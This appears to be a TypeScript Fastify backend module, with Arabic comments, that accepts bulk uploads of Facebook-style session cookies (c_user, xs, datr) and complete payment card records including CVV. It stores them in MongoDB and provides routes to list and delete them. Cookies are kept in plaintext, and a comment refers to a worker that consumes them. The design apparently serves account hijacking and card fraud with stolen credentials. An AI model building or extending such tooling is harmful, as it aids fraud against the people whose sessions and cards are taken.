import type { FastifyInstance } from 'fastify';
import { requireAuth } from '../../middleware/auth';
import { getDb } from '../../lib/mongo';
import { encryptJson } from '../../lib/encryption';
import { z } from 'zod';
import multipart from '@fastify/multipart';
import { parse } from 'csv-parse/sync';
import { ObjectId } from 'mongodb';

const stringish = z.union([z.string(), z.number()]).transform((v) => String(v));
const cookieSchema = z.object({ c_user: stringish, xs: stringish, fr: stringish.optional(), datr: stringish.optional(), country: stringish.optional() });
const cardSchema = z.object({ 
  number: stringish, 
  exp_month: stringish, 
  exp_year: stringish, 
  cvv: stringish, 
  country: stringish.optional()
});

export async function uploadRoutes(app: any) {
  app.register(multipart);

  app.post('/api/upload/cookies/json', { preHandler: requireAuth }, async (req: any, reply: any) => {
    try {
      const raw = req.body as any;
      const body = Array.isArray(raw) ? raw : (raw && Array.isArray(raw.items) ? raw.items : null);
      if (!Array.isArray(body)) {
        return reply.code(400).send({ error: 'Request body must be an array or an object with items array' });
      }
      
      const items = z.array(cookieSchema).parse(body);
      const db = await getDb();
      
      const cookiesCollection = db.collection('cookies');
      
      const docs = items.map((i) => ({ 
        // store plaintext fields directly for reliability
        c_user: i.c_user?.toString(),
        xs: i.xs?.toString(),
        fr: i.fr?.toString(),
        datr: i.datr?.toString(),
        country: i.country?.toString(),
        // keep an encrypted blob as optional backup for legacy paths (not used by worker now)
        payload: undefined,
        createdAt: new Date(),
        userId: new ObjectId('000000000000000000000000')
      }));
      
      await cookiesCollection.insertMany(docs);
      return { inserted: docs.length };
    } catch (error) {
      console.error('Error uploading cookies:', error);
      if (error instanceof z.ZodError) {
        return reply.code(400).send({ error: 'Invalid cookie data format', details: error.issues });
      }
      return reply.code(500).send({ error: 'Internal server error', message: (error as Error).message });
    }
  });

  app.post('/api/upload/cards/json', { preHandler: requireAuth }, async (req: any, reply: any) => {
    try {
      const raw = req.body as any;
      const body = Array.isArray(raw) ? raw : (raw && Array.isArray(raw.items) ? raw.items : null);
      if (!Array.isArray(body)) {
        return reply.code(400).send({ error: 'Request body must be an array or an object with items array' });
      }
      
      const items = z.array(cardSchema).parse(body);
      const db = await getDb();
      
      const cardsCollection = db.collection('cards');
      
      const docs = items.map((i) => ({ 
        payload: encryptJson(i), 
        cardNumber: i.number?.toString() || undefined,
        createdAt: new Date(),
        userId: new ObjectId('000000000000000000000000')
      }));
      
      await cardsCollection.insertMany(docs);
      return { inserted: docs.length };
    } catch (error) {
      console.error('Error uploading cards:', error);
      if (error instanceof z.ZodError) {
        return reply.code(400).send({ error: 'Invalid card data format', details: error.issues });
      }
      return reply.code(500).send({ error: 'Internal server error', message: (error as Error).message });
    }
  });

  app.post('/api/upload/cookies/csv', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const parts = req.parts();
    for await (const part of parts) {
      if (part.type === 'file') {
        const buf = await part.toBuffer();
        const records = parse(buf.toString('utf8'), { columns: true, skip_empty_lines: true });
        const items = z.array(cookieSchema).parse(records);
        const db = await getDb();
        const docs = items.map((i) => ({ 
          c_user: i.c_user?.toString(),
          xs: i.xs?.toString(),
          fr: i.fr?.toString(),
          datr: i.datr?.toString(),
          country: i.country?.toString(),
          payload: undefined,
          createdAt: new Date() 
        }));
        await db.collection('cookies').insertMany(docs);
        return { inserted: docs.length };
      }
    }
    return reply.code(400).send({ error: 'No file' });
  });

  app.post('/api/upload/cards/csv', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const parts = req.parts();
    for await (const part of parts) {
      if (part.type === 'file') {
        const buf = await part.toBuffer();
        const records = parse(buf.toString('utf8'), { columns: true, skip_empty_lines: true });
        const items = z.array(cardSchema).parse(records);
        const db = await getDb();
        const docs = items.map((i) => ({ payload: encryptJson(i), createdAt: new Date() }));
        await db.collection('cards').insertMany(docs);
        return { inserted: docs.length };
      }
    }
    return reply.code(400).send({ error: 'No file' });
  });

  // حذف بطاقة
  app.delete('/api/cards/:id', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const { id } = req.params as { id: string };
    const db = await getDb();
    const _id = (() => { try { return new ObjectId(id); } catch { return null; } })();
    if (!_id) return reply.code(400).send({ deleted: 0, error: 'Invalid id' });
    const res = await db.collection('cards').deleteOne({ _id });
    return { deleted: res.deletedCount };
  });

  // حذف كوكي
  app.delete('/api/cookies/:id', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const { id } = req.params as { id: string };
    const db = await getDb();
    const _id = (() => { try { return new ObjectId(id); } catch { return null; } })();
    if (!_id) return reply.code(400).send({ deleted: 0, error: 'Invalid id' });
    const res = await db.collection('cookies').deleteOne({ _id });
    return { deleted: res.deletedCount };
  });

  // الحصول على قائمة البطاقات
  app.get('/api/cards', { preHandler: requireAuth }, async (req: any) => {
    const { limit = 100, page = 1 } = req.query || {};
    const db = await getDb();
    const skip = (Number(page) - 1) * Number(limit);
    const items = await db.collection('cards')
      .find({})
      .project({ payload: 0 })
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(Number(limit))
      .toArray();
    const total = await db.collection('cards').countDocuments();
    return { items, total, page: Number(page), limit: Number(limit) };
  });

  // الحصول على قائمة الكوكيز مع c_user
  app.get('/api/cookies', { preHandler: requireAuth }, async (req: any) => {
    const { limit = 100, page = 1 } = req.query || {};
    const db = await getDb();
    const skip = (Number(page) - 1) * Number(limit);
    const raw = await db.collection('cookies')
      .find({})
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(Number(limit))
      .toArray();
    const items = raw.map((doc: any) => {
      if (doc.c_user) {
        return { _id: doc._id, c_user: doc.c_user, createdAt: doc.createdAt };
      }
      // Fallback: try decrypt if legacy encrypted docs
      try {
        const { decryptJson } = require('../../lib/encryption');
        const dec: any = decryptJson(doc.payload);
        return { _id: doc._id, c_user: dec.c_user ?? null, createdAt: doc.createdAt };
      } catch {
        return { _id: doc._id, c_user: null, createdAt: doc.createdAt };
      }
    });
    const total = await db.collection('cookies').countDocuments();
    return { items, total, page: Number(page), limit: Number(limit) };
  });
} 